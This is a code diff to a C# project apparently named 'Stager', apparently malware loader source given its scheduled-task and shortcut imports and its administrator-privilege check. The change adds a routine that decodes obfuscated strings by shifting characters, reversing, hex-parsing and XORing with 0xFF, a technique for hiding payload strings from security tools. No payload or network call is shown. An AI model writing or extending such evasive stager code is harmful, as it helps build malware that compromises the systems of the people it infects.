@@ -5,6 +5,7 @@ using System.Security.Principal;
 using IWshRuntimeLibrary;
 using Microsoft.Win32.TaskScheduler;
 using File = System.IO.File;
+using System.Text;
 
 namespace Stager
 {
@@ -122,8 +123,28 @@ namespace Stager
 
             Environment.Exit(0);
         }
+        internal string DecodeString(string encodedString)
+        {
+            // Step 1: Decrement each character code by 1
+            var charArray = encodedString.Select(c => (char)(c - 1)).ToArray();
 
-        internal bool IsAdministrator()
+            // Step 2: Reverse the string
+            Array.Reverse(charArray);
+
+            // Step 3: Convert each 2-digit hexadecimal string to a byte and XOR it with 0xFF
+            var byteArray = new byte[charArray.Length / 2];
+            for (int i = 0; i < charArray.Length; i += 2)
+            {
+                byte b = byte.Parse(new string(charArray, i, 2), System.Globalization.NumberStyles.HexNumber);
+                byteArray[i / 2] = (byte)(b ^ 0xFF);
+            }
+
+            // Step 4: Convert the byte array to a string using UTF-8 encoding
+            string decodedString = Encoding.UTF8.GetString(byteArray);
+            return decodedString;
+        }
+
+    internal bool IsAdministrator()
         {
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
